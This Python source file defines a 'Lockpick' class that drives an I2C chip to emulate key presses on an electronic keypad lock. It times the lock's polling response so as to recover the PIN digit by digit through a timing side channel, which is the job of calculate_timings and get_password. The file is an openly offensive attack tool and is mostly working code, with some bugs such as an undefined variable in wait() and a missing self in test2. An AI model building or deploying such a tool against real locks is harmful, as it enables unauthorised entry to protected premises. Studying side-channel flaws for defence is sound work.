import smbus
import time
from display import Display

class Lockpick:
    #timeout can't be found by polling the lock
    def __init__(self, lock_type="polling", password_length=4, timeout=3.5, discover_timings=True):
        self.display = Display()
        self.lock_type = lock_type
        self.password_length = password_length
        self.timeout = timeout
        self.keypad_keys = [["1", "2", "3"], ["4", "5", "6"], ["7", "8", "9"], ["*", "0", "#"]]
        self.rows = len(self.keypad_keys)
        self.columns = len(self.keypad_keys[0])
        self.i2c = smbus.SMBus(1)
        self.i2c.write_byte(0x38, 0xFF)
        self.column_bytes = [0b11110011, 0b11110101, 0b11111001]
        self.row_bytes = [0b11100001, 0b11010001, 0b10110001, 0b01110001, 0b11110001, 1]
        self.key_vectors = [(0,0),(0,1),(0,2),(1,0),(1,1),(1,2),(2,0),(2,1),(2,2),(3,0),(3,1),(3,2)]
        #The default of the i2c chip is to set all pins to high.
        #To not poll all the columns directly we call the unpress function
        self.unpress()
        print("insert cable")
        #time.sleep(10)
        self.calculate_timings(discover_timings)

    #press

    #Description:
        #pulls down a column based on parameter
    #Parameters:
        #column: integer - the column to be pulled down (0-2)

    def press(self, column):
        self.i2c.write_byte(0x38, self.column_bytes[column])


    #unpress

    #Description:
        #Sets the i2c chip to the default state of not pulling down columns and reading on other pins

    def unpress(self):
        self.i2c.write_byte(0x38, 0b11110001)


    #wait

    #Description:
        #Halts execution until a specified row or all rows are being polled
    #Parameters:
        #val: integer - the row to be waited for (4 for all rows)

    def wait(self, row, change=False):

        if change:
            value = self.row_bytes.index(self.i2c.read_byte(0x38))
            last_value = None
            while not ((last_value == (row-1)%4) and (value == row)):
                last_value = value
                value =self.row_bytes.index(self.i2c.read_byte(0x38))

#        if change:
#            value = self.i2c.read_byte(0x38)
#            while self.i2c.read_byte(0x38) == self.row_bytes[val]:
#        		pass

        else:
        	value = self.i2c.read_byte(0x38)
        	while self.i2c.read_byte(0x38) != self.row_bytes[val]:
        		pass


    #press_key()

    #Description:
        #Simulates a key press for interrupt or polling lock
    #Parameters:
        #row: integer - row of key being pressed
    	#column: integer - column of key being pressed
    	#return_time: Boolean - if response to key press should be timed
    #Returns:
    	#time taken to reactivate keypad after keypress (optional return)

    def press_key(self, row, column, return_time=False):
        if self.lock_type != "polling":
            self.press(column)
            time.sleep(0.01)
            self.unpress()


        self.wait(row, True)
        self.press(column)

        self.display.show(self.keypad_keys[row][column])
        if return_time:
            t0 = time.time()
        time.sleep(0.01)
        self.unpress()
        row = 4
        while (row == 4) or (row == 5):
            row = self.row_bytes.index(self.i2c.read_byte(0x38))

        if return_time:
            print(time.time() - t0)
            return time.time() - t0


    #calculate_timings

    #Description:
        #Analyzes the delta time between key polls
        #We assume that one key will be the correct key, thus one key will have a significantly shorter deltaT
        #We remove the correct deltaT and average the rest of the wrong deltaTs in order to calculate the threshold.
        #The threshold is used thoughout the class to determine if a key press is the correct.
    #Parameters:
        #automatic: Boolean

    def calculate_timings(self, automatic):
        if automatic:
            timings = []
            for row in range(self.rows):
                for column in range(self.columns):
                    timings.append(self.press_key(row, column, True))
                    time.sleep(1)
            print(timings)
            correct_time = min(timings)
            timings.remove(max(timings)) #allows code to work in case calculate_timings finds password
            incorrect_time = max(timings)
            self.threshold = (correct_time + incorrect_time) / 2
            print("correct time", correct_time)
            print("incorrect time", incorrect_time)
            print("threshold", self.threshold)
        else:
            self.threshold = 0.8


    #next_key

    #Description:
        #Finds the next character in the password
    #Parameters:
        #password: list - previous characters in password
    #Returns:
        #row and column of next character in password

#    def next_key(self, password):
#        password = []
#        print(password)
#        for row in range(self.rows):
#            for column in range(self.columns):
#                time.sleep(1)
#                for i in password:
#                    self.press_key(i[0], i[1], True)
#                    time.sleep(1)
#                    print("entering old password", i)
#                print("entering ", row, column)
#                time_taken = self.press_key(row, column, True)
#                print(time_taken)
#                if time_taken < self.threshold:
#                    print("returning", row, column)
#                    correct.append((row, column))
#        return correct

    def get_password(self):
        password = []
        for digit in range(self.password_length):
            for key in self.key_vectors:
                for i in password:
                    self.press_key(i[0],  i[1])
                if self.press_key(key[0], key[1], True) < self.threshold:
                    password.append(key)
                    break

        return password
    #press

    #Description:
        #Finds password
    #Returns:
        #plaintext password

#    def get_password(self):
#        password = []
#        while len(password) < self.password_length:
#            new_keys = self.next_key(password)
#            if new_keys:
#                password += (new_keys)
#        plaintext = ""
#        for i in password:
#            plaintext += self.keypad_keys[i[0]][i[1]]
#        return plaintext

    def test(self):
        val1 = self.i2c.read_byte(0x38)
        x = time.time()
        while True:
            val2 = val1
            val1 = self.i2c.read_byte(0x38)

            if val1 != val2:
                if (time.time()-x):
                    print(val1)
                    print(time.time()-x)
                x = time.time()

    def test2(self, val):
        x= time.time()


        press(val)
        time.sleep(0.005)
        val1 = self.i2c.read_byte(0x38)
        while (time.time() - x) < 1:
            val2 = val1
            val1 = self.i2c.read_byte(0x38)
            if val1 != val2:
                print(val1)





    def check_rows(self):
        while True:
            row = self.row_bytes.index(self.i2c.read_byte(0x38))
            print("row value", row)

    def press_columns(self):
        for column in range(self.columns):
            print("stage 1",column)
            self.press(column)
            t0 = time.time()
            print("stage 6: start measuring time",t0)
            print("stage 2: pressed")
            time.sleep(0.01)
            print("stage 3: waited .005")
            self.unpress()
            print("stage 5: unpressed")
            row = 4
            print(time.time()-t0)
            while (row == 4) or (row == 5):
                row = self.row_bytes.index(self.i2c.read_byte(0x38))
                #print("stage 4: read row", row)
            print("exit while")



            print(time.time()-t0)
            print("stage 7: wating for new poll")
            self.wait(row, True)
            print("stage 8: poll has started")
            print(time.time()-t0)
            t1 = time.time()
            print("stage 9: measure new t1", t1)
            dt = t1-t0
            print(t0,t1,dt,column,row,self.keypad_keys[row][column])

            time.sleep(1)
